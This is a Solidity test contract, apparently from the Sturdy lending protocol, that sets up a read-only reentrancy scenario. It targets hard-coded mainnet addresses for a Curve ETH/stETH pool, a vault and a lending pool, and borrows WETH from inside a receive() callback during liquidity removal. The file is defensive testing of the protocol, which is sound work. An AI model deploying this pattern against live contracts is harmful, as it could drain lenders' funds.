// SPDX-License-Identifier: agpl-3.0
pragma solidity ^0.8.0;

/**
 * @title TestContract
 * @notice TestContract
 * @author Sturdy
 **/

interface ICurvePool {
  function withdraw_admin_fees() external;

  function remove_liquidity_one_coin(
    uint256 _burn_amount,
    int128 i,
    uint256 _min_received
  ) external returns (uint256);

  function remove_liquidity(
    uint256 _amount,
    uint256[2] memory _min_amounts
  ) external returns (uint256);
}

interface IERC20 {
  function balanceOf(address account) external view returns (uint256);

  function approve(address spender, uint256 amount) external returns (bool);
}

interface IGeneralVault {
  function depositCollateral(address _asset, uint256 _amount) external payable;
}

interface ILendingPool {
  function borrow(
    address asset,
    uint256 amount,
    uint256 interestRateMode,
    uint16 referralCode,
    address onBehalfOf
  ) external;

  function deposit(address asset, uint256 amount, address onBehalfOf, uint16 referralCode) external;
}

contract ReEntrancyTest {
  ICurvePool private constant ETHSTETH = ICurvePool(0xDC24316b9AE028F1497c275EB9192a3Ea0f67022);
  address private constant COLLATERAL = 0x06325440D014e39736583c165C2963BA99fAf14E;
  address private constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
  IGeneralVault private constant CVX_ETH_STETH_VAULT =
    IGeneralVault(0x8d58c3574A6D32F5F848Abe8E7A03E8B92577c15);
  ILendingPool private constant POOL = ILendingPool(0x2A4d822BFB34d377c978F28a6C332Caa2fF87530);
  bool private isCheckEnabled;
  uint256 private collateralAmount;

  receive() external payable {
    if (isCheckEnabled) _borrowWETHFromPool(collateralAmount / 4);
  }

  function test() external {
    collateralAmount = IERC20(COLLATERAL).balanceOf(address(this));
    uint256 wethAmount = IERC20(WETH).balanceOf(address(this));

    //make test env
    _depositWETHToPool(wethAmount);
    _depositCollateralToVault(collateralAmount / 2);

    //make re-entrancy case
    uint256 ethAmount = ETHSTETH.remove_liquidity_one_coin(collateralAmount / 2 - 1, 0, 0);
    require(ethAmount > 0);

    //borrow
    _borrowWETHFromPool(collateralAmount / 4);
  }

  function _depositWETHToPool(uint256 amount) internal {
    IERC20(WETH).approve(address(POOL), amount);
    POOL.deposit(WETH, amount, address(this), 0);
  }

  function _depositCollateralToVault(uint256 amount) internal {
    IERC20(COLLATERAL).approve(address(CVX_ETH_STETH_VAULT), amount);
    CVX_ETH_STETH_VAULT.depositCollateral(COLLATERAL, amount);
  }

  function _borrowWETHFromPool(uint256 amount) internal {
    POOL.borrow(WETH, amount, 2, 0, address(this));
  }

  function enableCheck() external {
    isCheckEnabled = true;
  }
}
